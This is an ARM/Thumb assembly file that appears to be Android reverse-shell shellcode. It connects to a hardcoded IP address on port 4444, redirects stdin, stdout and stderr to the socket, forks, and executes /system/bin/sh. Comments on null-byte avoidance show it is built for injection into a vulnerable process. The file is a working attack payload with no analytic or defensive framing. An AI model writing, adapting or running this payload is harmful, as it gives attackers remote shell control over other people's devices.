.section .text
.global _start
  _start:
  .ARM
  add r4, pc, #1 // switch to thumb mode
  bx r4

  .THUMB
  mov r5, lr // save return address

  // socket(2, 1, 0)
  mov r0, #2
  mov r1, #1
  sub r2, r2, r2 // set r2 to null
  mov r7, #200 // r7 = 281 (socket)
  add r7, #81 // r7 value needs to be split
  svc #1 // r0 = host_sockid value
  mov r4, r0 // save host_sockid in r4

  // connect(r0, &sockaddr, 16)
  adr    r1, struct_addr // pointer to address, port
  strb  r2, [r1, #1] // write 0 for AF_INET
  mov    r2, #16
  add    r7, #2 // r7 = 283 (connect)
  svc    #1
 
  // dup2(sockfd, 0) 
  mov  r7, #63 // r7 = 63 (dup2) 
  mov   r0, r4 // r4 is the saved sockfd 
  sub   r1, r1  // r1 = 0 (stdin) 
  svc   #1
  // dup2(sockfd, 1) 
  mov   r0, r4  // r4 is the saved sockfd 
  mov   r1, #1  // r1 = 1 (stdout) 
  svc   #1
  // dup2(sockfd, 2) 
  mov   r0, r4  // r4 is the saved sockfd 
  mov   r1, #2  // r1 = 2 (stderr)
  svc   #1
  
  // dup2(r0, 0/1/2)
  mov   r7, #63
  mov   r1, #2
  Lb:
    mov   r0, r4
    svc   #1
    sub   r1, #1
    bpl   Lb  // branch if positive or zero
    
  // fork()
  mov r7, #190
  svc #1
  cmp r0, #0
  bne jump_back // if not child process -> return
 
  // argv = { "/system/bin/sh", "-c", "/system/bin/sh", 0 }
  // execve(argv[0], &argv[0], 0)
  mov r7, sp
  adr r0, binsh_path
  adr r1, binsh_path
  adr r2, cmd_flag
  adr r3, nullptr
 
  str r1, [sp]
  str r2, [sp, #4]
  str r1, [sp, #8]
  str r3, [sp, #12]
 
  mov r1, sp
  mov r2, #0
 
  mov r7, #11 // execve syscall number
  svc #1
 
  jump_back:
  mov pc, r5
  nop
 
 struct_addr:
 .ascii "\x02\xff" // AF_INET 0xff will be NULLed
 .ascii "\x11\x5c" // port number 4444
 .byte 10,21,0,141 // IP Address
 binsh_path:
 .ascii "/system/bin/sh\x00\x00"
 cmd_flag:
 .ascii "-c\x00\x00"
 nullptr:
 .ascii "\x00"
 
 /////// denullify tricks ///////
 // eor r1, r1, r1         // clear register r1. R1 = 0
 // eor r2, r2, r2         // clear register r2. r2 = 0
 // strb r2, [r0, #14]    // store null-byte for AF_INET
